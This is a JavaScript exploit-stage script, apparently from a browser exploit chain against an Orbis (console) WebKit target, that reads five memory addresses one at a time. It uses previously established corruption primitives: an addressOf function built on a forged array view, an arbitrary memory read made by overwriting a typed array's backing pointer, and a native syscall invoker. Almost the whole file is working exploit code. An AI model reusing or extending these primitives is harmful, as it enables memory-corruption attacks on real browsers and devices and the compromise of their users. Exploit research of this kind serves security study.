// Orbis web split-read, v1. Walk v2 died reading one of five targets —
// this probe reads them ONE AT A TIME with per-read markers so the exact
// faulting target is identified by which marker was the last to arrive.
// Read order: nearest-known-good first (0x12AB8070), then sub-structs
// (0x12AB42C0 → 0x12AB4368 → 0x12AB43A8), cross-region 0x09CA7E28 last.
// Marker budget exactly 8 (preflight, near/s38/s40 before+after, done) —
// s48 and cross use the safe helper past the cap. 64B per read.
// Requires installer v21 (sys593-607 + sys540/557/638 + dynlib family).
var result;
var phase = "preflight";
try {
  var state = window.__fw14ArrayState;
  var plan = window.__fw14NativePlan;
  var native = window.__fw14NativeInvoke;
  if (!state || !plan || !native || typeof native.call !== "function" ||
      !state.view || !state.array || !state.a || !state.ownedTypedView ||
      !Number.isSafeInteger(state.calibratedViewBase) ||
      state.array[0] !== state.a || !plan.store || !plan.pivot ||
      !plan.stack || !plan.frame || !plan.addresses ||
      !Number.isSafeInteger(plan.target) ||
      !Number.isSafeInteger(plan.webkitBase))
    throw new Error("held_plan_missing");
  var forged = state.view;
  var carrier = state.ownedTypedView;
  var base = state.calibratedViewBase;
  if (carrier.length !== 65536 || carrier[0] !== 0x31 ||
      carrier[7] !== 0xa8 || base % 4096 !== 0)
    throw new Error("carrier_canary_changed");
  function bytesAt(index, count) {
    var out = [];
    for (var n = 0; n < count; n++) out.push(forged[index + n]);
    return out;
  }
  function valueOf(bytes) {
    var value = 0;
    for (var n = bytes.length - 1; n >= 0; n--)
      value = value * 256 + bytes[n];
    return value;
  }
  function pointerBytes(value) {
    if (!Number.isSafeInteger(value) || value < 0 ||
        value >= 0x1000000000000)
      throw new Error("pointer_invalid");
    var out = [];
    for (var n = 0; n < 8; n++)
      out.push(Math.floor(value / Math.pow(2, n * 8)) & 255);
    return out;
  }
  function addressOf(object) {
    try {
      state.array[0] = object;
      return valueOf(bytesAt(state.index, 8));
    } finally {
      state.array[0] = state.a;
    }
  }
  var carrierIndex = addressOf(carrier) - base;
  var carrierSlot = carrierIndex + 8;
  if (!Number.isSafeInteger(carrierSlot) || carrierSlot < 0 ||
      carrierSlot + 8 >= 16777216)
    throw new Error("carrier_slot_invalid");
  var carrierOriginal = bytesAt(carrierSlot, 8);
  function readAt(addressValue, count) {
    if (!Number.isSafeInteger(addressValue) || count < 1 || count > 192)
      throw new Error("read_args_invalid");
    var next = pointerBytes(addressValue);
    try {
      for (var n = 0; n < 8; n++) forged[carrierSlot + n] = next[n];
      var out = [];
      for (var r = 0; r < count; r++) out.push(carrier[r]);
      return out;
    } finally {
      for (var x = 0; x < 8; x++)
        forged[carrierSlot + x] = carrierOriginal[x];
    }
  }
  function mark(phaseName) {
    try {
      if (api && typeof api.markSync === "function")
        api.markSync(phaseName);
    } catch (markerError) {}
  }
  function toHex(bytes) {
    var out = "";
    for (var i = 0; i < bytes.length; i++)
      out += ("0" + bytes[i].toString(16)).slice(-2);
    return out;
  }
  function toAscii(bytes) {
    var out = "";
    for (var i = 0; i < bytes.length; i++) {
      var ch = bytes[i];
      out += (ch >= 32 && ch < 127) ? String.fromCharCode(ch) : ".";
    }
    return out;
  }
  var before = native.call("getpid", []);
  if (before.high !== 0 || before.value < 1 || before.value > 100000)
    throw new Error("session_pid_changed");
  mark("orbis3_preflight");
  var targets = [
    { name: "near_70", addr: 0x12ab8070 },
    { name: "sub_38", addr: 0x12ab42c0 },
    { name: "sub_40", addr: 0x12ab4368 },
    { name: "sub_48", addr: 0x12ab43a8 },
    { name: "cross_78", addr: 0x09ca7e28 }
  ];
  var results = {};
  for (var t = 0; t < targets.length; t++) {
    phase = "read_" + targets[t].name;
    mark("orbis3_" + targets[t].name + "_before");
    var bytes = readAt(targets[t].addr, 64);
    mark("orbis3_" + targets[t].name + "_after");
    results[targets[t].name] = { hex: toHex(bytes),
      ascii: toAscii(bytes) };
  }
  phase = "done";
  mark("orbis3_done");
  var after = native.call("getpid", []);
  result = { id: "orbis_splitread_v1",
    status: (after.value === before.value && after.high === 0) ?
      "pass" : "fail",
    details: {
      near_70_hex: (results.near_70 ? results.near_70.hex : "FAULT"),
      near_70_ascii: (results.near_70 ? results.near_70.ascii : ""),
      sub_38_hex: (results.sub_38 ? results.sub_38.hex : "FAULT"),
      sub_40_hex: (results.sub_40 ? results.sub_40.hex : "FAULT"),
      sub_48_hex: (results.sub_48 ? results.sub_48.hex : "FAULT"),
      sub_48_ascii: (results.sub_48 ? results.sub_48.ascii : ""),
      cross_hex: (results.cross_78 ? results.cross_78.hex : "FAULT"),
      cross_ascii: (results.cross_78 ? results.cross_78.ascii : ""),
      pid_ok: after.value === before.value && after.high === 0 } };
} catch (error) {
  result = { id: "orbis_splitread_v1", status: "error",
    details: { phase: phase, error: String(error).slice(0, 180) } };
}
return [result];
